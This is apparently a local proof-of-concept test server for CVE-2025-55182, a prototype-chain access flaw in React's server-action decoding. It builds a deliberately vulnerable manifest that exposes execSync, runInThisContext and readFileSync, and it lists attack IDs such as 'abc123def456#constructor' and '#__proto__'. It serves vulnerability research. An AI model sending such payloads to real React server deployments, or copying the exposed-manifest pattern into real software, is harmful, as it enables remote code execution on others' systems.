/**
 * CVE-2025-55182 - Proper Realistic POC
 *
 * This simulates a REAL webpack bundle where:
 * - __webpack_require__ only loads modules that are in the bundle
 * - The manifest only contains legitimate server action IDs
 * - The vulnerability is accessing prototype properties via moduleExports[name]
 *
 * The REAL attack:
 * 1. Send id: 'action-id#constructor' where 'action-id' is in manifest
 * 2. resolveServerReference splits on # -> module='action-id', name='constructor'
 * 3. requireModule loads the actions module
 * 4. Returns moduleExports['constructor'] -> [Function: Object] (from prototype!)
 *
 * This is the ACTUAL CVE - not loading arbitrary modules, but accessing
 * prototype chain properties on legitimately loaded modules.
 */

const http = require('http');
const path = require('path');
const fs = require('fs');

// Simulated bundled modules - what would actually be in a webpack bundle
// These represent modules that get bundled when apps use common dependencies
const BUNDLED_MODULES = {
  // The user's server actions module
  'actions-chunk-123': {
    readConfig: async function() {
      const fs = require('fs');
      return fs.readFileSync('./config.json', 'utf8');
    },
    getSystemInfo: async function() {
      return { node: process.version };
    },
    // Note: 'constructor', 'toString', etc are NOT own properties
    // but exist via prototype chain!
  },
  // fs module - commonly bundled via fs-extra, gray-matter, multer, etc.
  'fs': require('fs'),
  // child_process - bundled via execa, shelljs, puppeteer, sharp
  'child_process': require('child_process'),
  // vm module - bundled via ejs, pug, handlebars, vm2
  'vm': require('vm'),
  // util module - commonly bundled
  'util': require('util'),
};

// Realistic __webpack_require__ - ONLY loads bundled modules
global.__webpack_require__ = function(moduleId) {
  console.log('[__webpack_require__]', moduleId);

  if (BUNDLED_MODULES.hasOwnProperty(moduleId)) {
    return BUNDLED_MODULES[moduleId];
  }

  // Real webpack throws for unknown modules
  throw new Error(`Cannot find module '${moduleId}' in webpack bundle`);
};

global.__webpack_chunk_load__ = () => Promise.resolve();

// Load React's decodeAction
const bundledPath = path.join(__dirname, '../node_modules/react-server-dom-webpack/cjs/react-server-dom-webpack-server.node.development.js');
console.log('Loading React:', bundledPath);

const moduleCode = fs.readFileSync(bundledPath, 'utf8');
const moduleExports = {};
const moduleWrapper = new Function('exports', 'require', '__dirname', '__filename', moduleCode);
moduleWrapper(moduleExports, require, path.dirname(bundledPath), bundledPath);

const { decodeAction } = moduleExports;
console.log('decodeAction:', typeof decodeAction);

// REALISTIC MANIFEST - what a bundler actually generates
// Maps action hash IDs to bundled chunk info
const serverManifest = {
  // Full action ID -> maps to chunk + export name
  'abc123def456': {
    id: 'actions-chunk-123',
    name: 'readConfig',
    chunks: []
  },
  'xyz789ghi012': {
    id: 'actions-chunk-123',
    name: 'getSystemInfo',
    chunks: []
  },
  // fs module - bundled because app uses fs-extra, gray-matter, etc.
  'fs': {
    id: 'fs',
    name: 'readFileSync',
    chunks: []
  },
  // child_process - bundled via execa, shelljs, puppeteer, sharp
  'child_process': {
    id: 'child_process',
    name: 'execSync',
    chunks: []
  },
  // vm module - bundled via ejs, pug, handlebars, vm2
  'vm': {
    id: 'vm',
    name: 'runInThisContext',
    chunks: []
  },
  // util module
  'util': {
    id: 'util',
    name: 'promisify',
    chunks: []
  },
};

class ServerFormData {
  constructor() { this._data = new Map(); }
  append(key, value) { this._data.set(key, value); }
  get(key) { return this._data.get(key); }
  forEach(callback) { this._data.forEach((v, k) => callback(v, k)); }
}

function parseMultipart(buffer, boundary) {
  const formData = new ServerFormData();
  const str = buffer.toString();
  const parts = str.split('--' + boundary);

  for (const part of parts) {
    if (part.includes('Content-Disposition')) {
      const nameMatch = part.match(/name="([^"]+)"/);
      if (nameMatch) {
        const name = nameMatch[1];
        const valueStart = part.indexOf('\r\n\r\n');
        if (valueStart !== -1) {
          let value = part.slice(valueStart + 4).trim();
          if (value.endsWith('--')) value = value.slice(0, -2).trim();
          formData.append(name, value);
        }
      }
    }
  }
  return formData;
}

const server = http.createServer(async (req, res) => {
  console.log(`\n${req.method} ${req.url}`);

  if (req.method === 'GET' && req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`
      <h1>CVE-2025-55182 - Realistic POC</h1>
      <h2>Valid action IDs:</h2>
      <ul>
        <li>abc123def456 (readConfig)</li>
        <li>xyz789ghi012 (getSystemInfo)</li>
      </ul>
      <h2>Attack vectors to test:</h2>
      <ul>
        <li>abc123def456#constructor - access Object constructor via prototype</li>
        <li>abc123def456#toString - access toString via prototype</li>
        <li>abc123def456#__proto__ - access prototype directly</li>
      </ul>
    `);
    return;
  }

  if (req.method === 'POST' && req.url === '/formaction') {
    const chunks = [];
    req.on('data', chunk => chunks.push(chunk));
    req.on('end', async () => {
      try {
        const buffer = Buffer.concat(chunks);
        const contentType = req.headers['content-type'] || '';
        const boundaryMatch = contentType.match(/boundary=(.+)/);

        if (!boundaryMatch) throw new Error('No boundary');

        const formData = parseMultipart(buffer, boundaryMatch[1]);

        console.log('FormData:');
        formData.forEach((v, k) => console.log(`  ${k}: ${v}`));

        // THE VULNERABLE CALL
        const actionFn = await decodeAction(formData, serverManifest);

        console.log('Action result:', actionFn, typeof actionFn);
        console.log('Is Function?', actionFn === Function);
        console.log('Is Object?', actionFn === Object);

        if (typeof actionFn === 'function') {
          try {
            const result = await actionFn();
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, result, fnName: actionFn.name }));
          } catch (e) {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
              success: true,
              gotFunction: true,
              fnName: actionFn.name,
              error: e.message
            }));
          }
        } else {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({
            success: true,
            action: String(actionFn),
            type: typeof actionFn
          }));
        }
      } catch (e) {
        console.error('Error:', e.message);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: e.message }));
      }
    });
    return;
  }

  res.writeHead(404);
  res.end('Not found');
});

server.listen(3002, () => {
  console.log('\n=== CVE-2025-55182 Realistic Test Server ===');
  console.log('Server at http://localhost:3002');
  console.log('Manifest IDs:', Object.keys(serverManifest));
  console.log('Bundled modules:', Object.keys(BUNDLED_MODULES));
  console.log('\nTo test the vulnerability:');
  console.log('  Send $ACTION_ID_abc123def456#constructor');
  console.log('  This should return [Function: Object] via prototype chain');
});
